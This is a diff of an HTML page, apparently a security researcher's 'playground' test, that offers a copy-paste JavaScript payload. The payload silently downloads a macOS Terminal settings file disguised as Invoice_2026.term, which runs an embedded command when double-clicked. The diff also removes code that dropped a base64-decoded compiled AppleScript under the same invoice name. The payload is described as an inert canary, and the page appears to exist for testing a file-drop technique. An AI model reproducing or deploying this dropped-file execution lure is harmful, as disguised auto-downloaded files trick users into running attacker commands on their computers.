@@ -14,18 +14,13 @@ button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;
 </head>
 <body>
 <h1>Pluto Security — playground clean copy</h1>
-<div id="hdr">PAYLOAD: T72b — CLEAN dropped-file execution demo (inert canary)
-Epoch: 1792656622
+<div id="hdr">PAYLOAD: T72c — .term file only (inert canary)
+Epoch: 1792656622 (T72b variant — .term only, one download per run)
 
-Run → two REAL artifacts land in ~/Downloads:
-1. Invoice_2026.scpt — genuinely compiled AppleScript (opens Script
-   Editor directly, tidy document; press Run → Calculator + canary
-   dialog).
-2. Invoice_2026.term — Terminal settings file (double-click →
-   Terminal opens and runs the embedded command).
-Double-click each in Finder and report exactly what happens.</div>
+Run → Invoice_2026.term lands in ~/Downloads → double-click it in
+Finder → report exactly what appears (Terminal? warning? nothing?).</div>
 <button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the playground'});this.textContent='COPIED — paste it in the playground'">COPY PAYLOAD</button>
-<pre id="code">/* T72b - CLEAN DROPPED-FILE EXECUTION DEMO, INERT (Pluto Security).
+<pre id="code">/* T72c - .term-only drop (one file per page load). T72b base.
    T72 attempt 1 dropped PLAIN TEXT with a .scpt name - macOS showed an
    awkward app-chooser / raw source. T72b drops REAL artifacts:
    1. Invoice_2026.scpt  - a genuinely COMPILED AppleScript (osacompile,
@@ -63,15 +58,8 @@ Double-click each in Finder and report exactly what happens.</div>
     } catch (e) { log(&quot;write &quot; + name + &quot; ERR &quot; + e.message); }
   }
 
-  /* 1. compiled .scpt */
-  try {
-    var bin = atob(B64);
-    var bytes = new Uint8Array(bin.length);
-    for (var i = 0; i &lt; bin.length; i++) bytes[i] = bin.charCodeAt(i);
-    drop(&quot;Invoice_2026.scpt&quot;, new Blob([bytes], { type: &quot;application/x-applescript&quot; }));
-  } catch (e) { log(&quot;scpt decode ERR &quot; + e.message); }
-
-  /* 2. .term Terminal settings file */
+  /* (.scpt drop removed — one silent download per page load) */
+  /* .term Terminal settings file */
   var term = [
     &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;,
     &#x27;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&#x27;,
